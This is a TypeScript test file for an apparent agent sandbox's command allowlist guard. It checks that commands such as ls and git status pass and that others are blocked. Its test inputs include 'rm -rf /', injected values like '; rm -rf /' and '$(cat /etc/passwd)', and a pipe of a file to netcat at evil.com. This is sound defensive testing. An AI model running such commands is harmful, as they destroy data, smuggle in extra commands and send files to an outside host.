import { strict as assert } from 'assert';
import { validateCommand } from '../src/security/command_guard.js';
import type { BrowseAgenticConfig } from '../src/types.js';

const config: BrowseAgenticConfig['rsi'] = {
  sandbox_root: '.',
  protected_patterns: [],
  hidden_patterns: [],
  command_allowlist: ['ls', 'cat', 'git status', 'git commit', 'npm run', 'node'],
  command_timeout_ms: 30000,
  max_stdout_chars: 50000,
};

// Test 1: Allowed commands pass
assert.equal(validateCommand('ls', [], config), null, 'ls should be allowed');
assert.equal(validateCommand('cat', ['file.txt'], config), null, 'cat should be allowed');
assert.equal(validateCommand('git status', [], config), null, 'git status should be allowed');
assert.equal(validateCommand('npm run', ['build'], config), null, 'npm run should be allowed');
console.log('PASS: allowed commands accepted');

// Test 2: Blocked commands rejected
const rmResult = validateCommand('rm', ['-rf', '/'], config);
assert.notEqual(rmResult, null, 'rm should be blocked');
assert.ok(rmResult!.includes('not in the allowlist'), 'should mention allowlist');
console.log('PASS: blocked commands rejected');

// Test 3: Shell metacharacters blocked
const semiResult = validateCommand('ls', ['; rm -rf /'], config);
assert.notEqual(semiResult, null, 'semicolon should be blocked');
assert.ok(semiResult!.includes('metacharacters'), 'should mention metacharacters');

const pipeResult = validateCommand('cat', ['file.txt | nc evil.com 4444'], config);
assert.notEqual(pipeResult, null, 'pipe should be blocked');

const backtickResult = validateCommand('echo', ['`whoami`'], config);
assert.notEqual(backtickResult, null, 'backticks should be blocked');

const dollarResult = validateCommand('echo', ['$(cat /etc/passwd)'], config);
assert.notEqual(dollarResult, null, '$() should be blocked');
console.log('PASS: shell metacharacters blocked');

// Test 4: curl/wget not in default allowlist
const curlResult = validateCommand('curl', ['https://evil.com'], config);
assert.notEqual(curlResult, null, 'curl should be blocked');
const wgetResult = validateCommand('wget', ['https://evil.com'], config);
assert.notEqual(wgetResult, null, 'wget should be blocked');
console.log('PASS: curl/wget blocked');

// Test 5: sudo blocked
const sudoResult = validateCommand('sudo', ['rm', '-rf', '/'], config);
assert.notEqual(sudoResult, null, 'sudo should be blocked');
console.log('PASS: sudo blocked');

console.log('\nAll command guard tests passed');
